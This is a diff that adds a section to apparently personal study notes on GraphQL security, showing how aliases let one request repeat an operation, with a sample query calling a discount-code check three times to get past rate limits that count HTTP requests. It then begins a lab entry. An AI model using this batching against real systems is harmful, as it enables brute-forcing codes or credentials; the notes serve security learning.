@@ -87,6 +87,40 @@
     }
 ```
 
+### Bypassing rate limiting using aliases
+ - aliases are used to Explicitly name the instance name to instances being returned, so we can have 2 properties of same type.
+```
+#Valid query using aliases
+
+    query getProductDetails {
+        product1: getProduct(id: "1") {
+            id
+            name
+        }
+        product2: getProduct(id: "2") {
+            id
+            name
+        }
+    }
+```
+ - Some rate limiters work based on the number of HTTP requests received rather than the number of operations performed on the endpoint.
+```
+#Request with aliased queries
+
+    query isValidDiscount($code: Int) {
+        isvalidDiscount(code:$code){
+            valid
+        }
+        isValidDiscount2:isValidDiscount(code:$code){
+            valid
+        }
+        isValidDiscount3:isValidDiscount(code:$code){
+            valid
+        }
+    }
+```
+ - See how made query to same object 3x in same request.
+
 ### LABS
 ##### Lab: Accessing private GraphQL posts
  - Looked at http history, sent data to inQL, Type the full URL in inQL scanner, I see
